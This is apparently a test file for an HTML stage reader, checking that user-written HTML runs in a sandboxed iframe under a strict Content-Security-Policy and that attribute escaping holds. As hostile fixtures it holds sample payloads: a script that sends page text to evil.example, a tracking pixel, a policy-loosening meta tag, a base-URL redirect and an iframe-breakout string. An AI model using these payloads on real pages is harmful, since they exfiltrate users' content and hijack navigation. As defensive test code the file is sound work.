// Run with `npm test`. What the reader frames for an HTML stage (components/stage-reader.tsx).
import assert from 'node:assert/strict'
import { describe, it } from 'node:test'
import { STAGE_FRAME_POLICY, STAGE_FRAME_SANDBOX, stageFrameDocument, withStagePolicy } from './stage-frame.ts'

const META = `<meta http-equiv="Content-Security-Policy" content="${STAGE_FRAME_POLICY}">`
/** The stage as the wrapper's inner frame gets it: the `srcdoc` attribute, read back the way a browser reads it. */
const framed = (document: string) => /<iframe sandbox="([^"]*)" srcdoc="([^"]*)"><\/iframe>/.exec(document)!
const unescaped = (value: string) => value.replace(/&quot;/g, '"').replace(/&amp;/g, '&')

describe('the policy an HTML stage runs under', () => {
  it('lets the stage run its own script and styles and show embedded images, and names no address it may reach', () => {
    const directives = Object.fromEntries(STAGE_FRAME_POLICY.split('; ').map((directive) => { const [name, ...values] = directive.split(' '); return [name, values] }))
    assert.deepEqual(directives, { 'default-src': ["'none'"], 'img-src': ['data:'], 'style-src': ["'unsafe-inline'"], 'script-src': ["'unsafe-inline'"], 'form-action': ["'none'"], 'base-uri': ["'none'"] })
    assert.doesNotMatch(STAGE_FRAME_POLICY, /https?:|\*|'self'|blob:|connect-src|frame-src/)
  })
  it('the sandbox gives scripts and nothing of the page: no same origin, no popups, no top navigation, no forms', () => {
    assert.equal(STAGE_FRAME_SANDBOX, 'allow-scripts')
  })
})

describe('an HTML stage with the policy put in', () => {
  it('reads the policy before anything the stage wrote, and keeps its doctype first', () => {
    assert.equal(withStagePolicy('<!doctype html><html><head><title>Deck</title></head></html>'), `<!doctype html>${META}<html><head><title>Deck</title></head></html>`)
    assert.equal(withStagePolicy('\n<!DOCTYPE html>\n<section>One</section>'), `\n<!DOCTYPE html>${META}\n<section>One</section>`)
    assert.equal(withStagePolicy('<section>One</section>'), `${META}<section>One</section>`)
  })
  it('a stage that sends its text out, loosens the policy or moves the base still has ours ahead of all of it', () => {
    const hostile = [
      '<meta http-equiv="Content-Security-Policy" content="default-src *; script-src * \'unsafe-inline\'">',
      '<base href="https://evil.example/">',
      '<img src="https://evil.example/pixel?secret">',
      '<script>fetch("https://evil.example/?" + document.body.innerText)</script>',
    ]
    for (const tag of hostile) {
      for (const document of [tag, `<!doctype html>${tag}`, `<!doctype html><html><head>${tag}</head></html>`, `<!-- a comment --><!doctype html>${tag}`]) {
        const guarded = withStagePolicy(document)
        assert.ok(guarded.indexOf(META) >= 0 && guarded.indexOf(META) < guarded.indexOf(tag), document)
        assert.equal(guarded.replace(META, ''), document)
      }
    }
    // A doctype look-alike further in is not where the policy goes.
    assert.equal(withStagePolicy('<script>send()</script><!doctype html>'), `${META}<script>send()</script><!doctype html>`)
  })
})

describe('what the reader frames', () => {
  const deck = '<!doctype html><html><body class="a&b"><section title="Say &quot;hi&quot;">One</section><script>if (a && b) go("next")</script></body></html>'
  it('is a wrapper under the same policy that holds the stage in a sandboxed frame of its own', () => {
    const document = stageFrameDocument(deck)
    assert.ok(document.startsWith(`<!doctype html><html><head>${META}`))
    const [, sandbox, srcdoc] = framed(document)
    assert.equal(sandbox, 'allow-scripts')
    assert.equal(unescaped(srcdoc), withStagePolicy(deck))
    // The wrapper has one frame and no script of its own; the policy gives a frame no address to go to.
    assert.equal(document.match(/<iframe/g)?.length, 1)
    assert.doesNotMatch(document.replace(srcdoc, ''), /<script/)
  })
  it('a stage cannot close the frame\'s attribute and write into the wrapper', () => {
    const escape = '"></iframe><script>parent.location = "https://evil.example"</script><iframe srcdoc="'
    const document = stageFrameDocument(escape)
    const [, , srcdoc] = framed(document)
    assert.equal(unescaped(srcdoc), withStagePolicy(escape))
    assert.equal(document.replace(srcdoc, '').includes('evil.example'), false)
    assert.doesNotMatch(srcdoc, /"/)
  })
})
